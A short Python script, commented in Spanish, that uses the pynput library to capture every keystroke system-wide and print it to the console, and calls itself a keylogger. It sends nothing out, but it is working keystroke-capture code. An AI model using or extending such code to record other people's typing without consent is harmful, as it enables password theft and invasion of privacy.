from pynput import keyboard

captura_teclas = []
MAX_CARACTERES = 60  
def procesar_tecla(tecla):
    """Procesa cada tecla presionada y la agrega a la lista captura_teclas."""
    try:
        if tecla.char:  
            captura_teclas.append(tecla.char)
            mostrar_texto()  
    except AttributeError:
        manejar_teclas_especiales(tecla)  

def manejar_teclas_especiales(tecla):
    """Maneja las teclas especiales como espacio, enter y backspace."""
    if tecla == keyboard.Key.space:
        captura_teclas.append(' ')
        mostrar_texto()
    elif tecla == keyboard.Key.enter:
        captura_teclas.append('\n')
        mostrar_texto()  
    elif tecla == keyboard.Key.backspace and captura_teclas:
        captura_teclas.pop()  
        mostrar_texto()  

def mostrar_texto():
    """Muestra el texto capturado en la consola."""
    texto = ''.join(captura_teclas)

    if len(texto) >= MAX_CARACTERES and not texto.endswith('\n'):
        texto += '\n'  

    print(texto)  

def iniciar_keylogger():
    """Inicia el listener del teclado para capturar las teclas presionadas."""
    try:
        with keyboard.Listener(on_press=procesar_tecla) as listener:
            listener.join()
    except KeyboardInterrupt:
        print("\nKeylogger finalizado.")

if __name__ == "__main__":
    iniciar_keylogger()
